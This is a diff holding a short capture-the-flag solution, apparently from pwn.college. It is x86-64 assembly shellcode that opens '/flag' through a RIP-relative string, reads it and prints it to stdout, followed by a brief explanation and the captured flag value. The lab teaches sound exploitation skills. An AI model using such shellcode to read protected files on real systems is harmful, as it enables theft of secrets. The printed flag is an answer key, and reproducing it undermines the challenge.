@@ -1,1 +1,31 @@
-a
+📅 2026-11-11
+.intel_syntax noprefix
+.global _start
+_start:
+lea rdi, [rip+path]
+mov rsi, 0
+mov rax, 2
+syscall
+mov rdi, rax
+sub rsp, 1024
+mov rsi, rsp
+mov rdx, 1024
+mov rax, 0
+syscall
+mov rdx, rax
+mov rdi, 1
+mov rsi, rsp
+mov rax, 1
+syscall
+mov rdi, 42
+mov rax, 60
+syscall
+path:
+        .asciz "/flag"
+
+## 🧑🏾‍🏫 what this challenge teaches u
+how use RIP-relative hardcoded strings to open files
+in this case we did not write each char in the stack but saved the filenames in path and then used rip to allow open syscall to open it
+
+## 🏁 Flag  
+pwn.college{0aRBgS3Zrn7_C_QcCTZzsuUJPT4.01N3ATNywCO4IDOxEzW}
